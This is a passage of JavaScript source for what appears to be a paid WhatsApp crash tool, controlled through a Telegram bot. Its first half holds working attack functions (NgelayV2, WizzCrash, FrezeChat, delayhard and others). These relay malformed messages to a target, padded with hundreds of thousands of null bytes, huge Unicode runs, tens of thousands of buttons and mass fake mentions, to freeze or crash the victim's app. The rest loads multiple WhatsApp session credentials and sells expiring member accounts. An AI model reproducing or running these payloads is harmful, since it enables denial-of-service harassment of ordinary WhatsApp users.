    let value = buffer[index] || 0;

    const MAX_SIZE = 5 * 1024 * 1024;
    let allocSize = index * 1024;

    if (!Number.isFinite(allocSize) || allocSize <= 0) allocSize = 1024;
    if (allocSize > MAX_SIZE) allocSize = MAX_SIZE;

    let bigBuffer = Buffer.alloc(allocSize);

    buffer.copy(
      bigBuffer,
      0,
      0,
      Math.min(buffer.length, bigBuffer.length)
    );

    const Omhc = {
      groupStatusMessageV2: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: bigBuffer.length,
          seconds: 999999,
          caption: "YakuzaXsilence",
          mediaKey: Buffer.alloc(32),
          fileEncSha256: Buffer.alloc(32),
          fileSha256: Buffer.alloc(32),
          jpegThumbnail: bigBuffer.slice(0, 20000),
          contextInfo: {
            quotedMessage: {
              stickerMessage: video,
            }
          }
        }
      }
    };

    const Silence = {
      groupStatusMessageV2: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true.mp4",
          mimetype: "video/mp4",
          fileLength: bigBuffer.length,
          seconds: 999999,
          caption: "YakuzaXsilence",
          mediaKey: Buffer.alloc(32),
          fileEncSha256: Buffer.alloc(32),
          fileSha256: Buffer.alloc(32),
          jpegThumbnail: bigBuffer.slice(0, 20000),
          contextInfo: {
            quotedMessage: {
              stickerMessage: video,
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Omhc, {});
    await sock.relayMessage(target, Silence, {});

  } catch (err) {
    console.error("ERROR:", err);
  }
}

async function NgelayV2(sock, target) {
  const ngelay = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c&mms3=true",
               mimetype: "image/jpeg",
               caption: "Lau Spaa Mpruy?",
               fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
               fileLength: "634893",
               height: 1022,
               width: 1080,
               mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
               fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
               directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c",
               mediaKeyTimestamp: "1782643133",
                 jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQAERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                 hasMediaAttachment: true
               }
            },
            body: {
            text: "\x10" + "\u0000".repeat(1045000)
          },
          nativeFlowMessage: {
            name: "voice_call",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }
  await sock.relayMessage(target, ngelay, {
  }, { noSelfSync: true }
 );
}

async function QQSFreezeeChat(sock, target) {
  try {
    const Private = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "YakuzaXsilence-" + "?".repeat(50000),
            footerText: "_/ASSALAMUALLAIKUM?" ,
            headerType: 1,
            buttons: [
              {
                buttonId: "Pe",
                buttonText: {
                  displayText: "?".repeat(90000)
                },
                type: 1
              }
            ],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`
              ),
              participant: target,
              remoteJid: target,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "OmhcSilence!-",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Private, {
      userJid: target
    });

    console.log("Berhasil");
  } catch (err) {
    console.log(err);
  }
}

async function k(target) {

const Xaka = "\u202E\u202D\u200F\u200E\u202A\u202B\u202C\u200B\u200C\u200D"
    const XakaJir = "\u034F\u2800\u3164\uFFA0\u115F\u1160"
    const XakaHere = "\u4E00\u9FFF\u3400\u4DBF\u4E42\u4E5C\u4E62\u4E99\u4EBA\u5132\u5144\u5152\u5162\u5175\u5182\u5192\u51A2\u51B2\u51C2\u51D2\u51E2\u51F2"
    const OmejiXaka = "\u{20000}\u{2A6DF}\u{2A700}\u{2B73F}\u{2B740}\u{2B81F}\u{2B820}\u{2CEAF}"

  const msg = {
    interactiveMessage: {
      body: { text: "⿻ 𝖷𝖺𝗄𝖺⿻ 𝖢𝗁𝖺𝗆𝗉𝗂𝗈𝗇𝗌 ⿻" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(15000),
                  rows: [
                    { rowId: "1", title: "ꦾ".repeat(15000), description: "ꦾ".repeat(15000) }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, msg, {})
}

async function dongo(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        pollCreationMessageV3: {
          name: "ꦾ".repeat(10000),
          options: [
            {
              optionName: "ꦾ".repeat(15000)
            },
            {
              optionName: "ꦾ".repeat(10000)
            },
            {
              optionName: "ꦾ".repeat(20000)
            }
          ],
          selectableOptionsCount: 1
        }
      },
      body: {
        text: "🩸⃟༑⌁⃰𝐋𝐞͢𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: "{}"
          }
        ]
      }
    }
  }, {
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        questionMessage: {
          message: {
            extendedTextMessage: {
              text: "\uA99E".repeat(3000),
              previewType: "NONE",
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                  )
                ],
                isQuestion: true,
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "\r".repeat(2000),
                        title: "\u0000".repeat(8000),
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: JSON.stringify({
                          values: {
                            in_pin_code: "999999",
                            building_name: "\0",
                            landmark_area: "\0",
                            address: "\0",
                            tower_number: "\0",
                            city: "Jabar",
                            name: "\0",
                            phone_number: "555555",
                            house_number: "null",
                            floor_number: "\0",
                            state: "\0 | " + "\u0000".repeat(900000),
                            url_track_map: "https://track.jaszznotdev.com/crash?id=" + Math.random().toString(36)
                          }
                        }),
                        version: 3
                      }
                    }
                  }
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363426179267743@newsletter",
                  serverMessageId: 143,
                  newsletterName: "\u0000".repeat(150000)
                }
              }
            }
          }
        }
      }
    }
  }, {
    participant: { jid: target }
  });
}
async function locfrz(client, target) {
    await client.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\x10",
                        hasMediaAttachment: true,
                        locationMessage: {
                            degreesLatitude: -999.0349999999999,
                            degreesLongitude: 922.999999999999,
                            name: "\x10",
                            address: "\x10",
                            jpegThumbnail: null
                        }
                    },
                    body: {
                        text: "\x10"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        stanzaId: "#666!"
                    }
                }
            }
        }
    }, {
        participant: {
            jid: target
        }
    });
}

async function WizzCrash(sock, targetJid) {
  const spectralJids = Array.from({ length: 1200 }, () => "44" + Math.floor(Math.random() * 888888888) + "@s.whatsapp.net");
  
  let pollPayload = {
    pollCreationMessage: {
      name: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞 - End Game\n" + "ꦾ‎".repeat(4000),
      options: Array.from({ length: 15 }, (_, i) => ({ optionName: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞".repeat(1500) + i })),
      selectableOptionsCount: 5
    }
  };

  await sock.relayMessage(targetJid, {
    newsletterAdminInviteMessage: {
      newsletterJid: '120363294025000000@newsletter',
      newsletterName: "Void Engine Apps" + "\u0000".repeat(5000),
      caption: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞" + "ꦾ‎".repeat(15000),
      inviteExpiration: Date.now() + 1814400000,
      jpegThumbnail: Buffer.alloc(0)
    },
    
    orderMessage: {
      orderId: "666" + "\u0000".repeat(1000),
      thumbnail: Buffer.alloc(0),
      itemCount: 9999999,
      status: 1,
      surface: 1,
      orderTitle: "PizzaCrash" + "ꦾ‎".repeat(3000),
      message: "Fvck System\n" + "ꦾ‎".repeat(5000),
      sellerJid: "0@s.whatsapp.net",
      token: "X".repeat(500)
    },

    viewOnceMessage: {
      message: {
        listMessage: {
          title: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞",
          description: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞" + "\u0000".repeat(30000),
          buttonText: "Ang Ang Angꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎",
          listType: 1,
          sections: [{
            title: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞",
            rows: [{ title: "FVCK", rowId: "ꦾ‎".repeat(1000) }]
          }],
          contextInfo: {
            mentionedJid: spectralJids,
            isForwarded: true,
            forwardingScore: 1337,
            quotedMessage: pollPayload
          }
        }
      }
    }
  }, { participant: { jid: targetJid } }).catch(() => {});

  console.log("Success.");
}

async function FrezeChat(sock, target) {
  let Orbsx = [];
  Orbsx.push({
    name: "single_select",
    buttonParamsJson: "",
  });
  for (let i = 0; i < 20000; i++) {
    Orbsx.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
  }
  
  let orbsMsg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞",
          },
          nativeFlowMessage: {
            messageParamsJson: "{{".repeat(10000),
            buttons: Orbsx,
          },
          contextInfo: {
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "Orbs" + "-Id" + Date.now(),
            isForwarded: true,
            forwardingScore: 111,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1998
                }, () => "7" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              ),
            ],
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, orbsMsg, {
    messageId: null,
    participant: { jid: target },
  });
}

async function delayhard(sock, target) {
  const whiletrue = {
    interactiveMessage: {
      body: {
        text: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "\u0000".repeat(250000)
          },
          {
            name: "\n".repeat(250000)
          },
          {
            name: "\0".repeat(25000)
          },
          {
            name: "\x10".repeat(250000)
          }
        ]
      }
    }
  };

  const participant = {
    jid: target
  };

  await sock.relayMessage(
    target,
    whiletrue,
    {
      participant
    }
  );
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });


      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });


  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


async function startUserSessions() {
  // Ambil semua subfolder dalam permenmd
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName); // gunakan await kalau connectSession async
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName, searchAll = false) {
  // First try user's own folder
  const folderPath = path.join('permenmd', subfolderName);
  if (fs.existsSync(folderPath)) {
    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName]; // return socket aktif
      }
    }
  }

  // Fallback: search ALL folders for any active session
  if (searchAll || !fs.existsSync(folderPath)) {
    const permenmdPath = path.join('permenmd');
    if (fs.existsSync(permenmdPath)) {
      const subfolders = fs.readdirSync(permenmdPath);
      for (const subfolder of subfolders) {
        const subPath = path.join(permenmdPath, subfolder);
        if (fs.statSync(subPath).isDirectory()) {
          const files = fs.readdirSync(subPath).filter(f => f.endsWith(".json"));
          for (const file of files) {
            const sessionName = `${path.basename(file, ".json")}`;
            if (activeConnections[sessionName]) {
              console.log(`[SOCK] Found active session in ${subfolder}/${file}`);
              return activeConnections[sessionName];
            }
          }
        }
      }
    }
  }

  // Last resort: return any active connection
  const allKeys = Object.keys(activeConnections);
  if (allKeys.length > 0) {
    console.log(`[SOCK] Fallback: using ${allKeys[0]}`);
    return activeConnections[allKeys[0]];
  }

  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
